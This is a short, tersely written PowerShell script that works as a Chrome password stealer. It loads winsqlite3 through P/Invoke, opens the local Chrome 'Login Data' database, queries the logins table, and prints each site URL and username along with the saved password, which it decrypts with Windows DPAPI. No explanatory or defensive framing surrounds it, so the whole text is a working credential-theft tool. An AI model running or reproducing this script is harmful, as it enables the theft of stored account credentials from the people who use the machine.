$d=Add-Type -A System.Security
$p='public static'
$g=""")]$p extern"
$i='[DllImport("winsqlite3",EntryPoint="sqlite3_'
$m="[MarshalAs(UnmanagedType.LP"
$q='(s,i)'
$f='(p s,int i)'
Add-Type "using System.Runtime.InteropServices;using p=System.IntPtr;$p class W{$($i)open$g p O($($m)Str)]string f,out p d);$($i)prepare16_v2$g p P(p d,$($m)WStr)]string l,int n,out p s,p t);$($i)step$g p S(p s);$($i)column_text16$g p C$f;$($i)column_bytes$g int Y$f;$($i)column_blob$g p L$f;$p string T$f{return Marshal.PtrToStringUni(C$q);}$p byte[] B$f{var r=new byte[Y$q];Marshal.Copy(L$q,r,0,Y$q);return r;}}"
$s=[W]::O($env:LOCALAPPDATA+'\Google\Chrome\User Data\Default\Login Data',[ref]$d)
$_=[W]::P($d,"SELECT*FROM logins",-1,[ref]$s,0)
for(;!([W]::S($s)%100)){[W]::T($s,1),[W]::T($s,3),([Security.Cryptography.ProtectedData]::Unprotect([W]::B($s,5),$null,1)|%{[char]$_})-join''}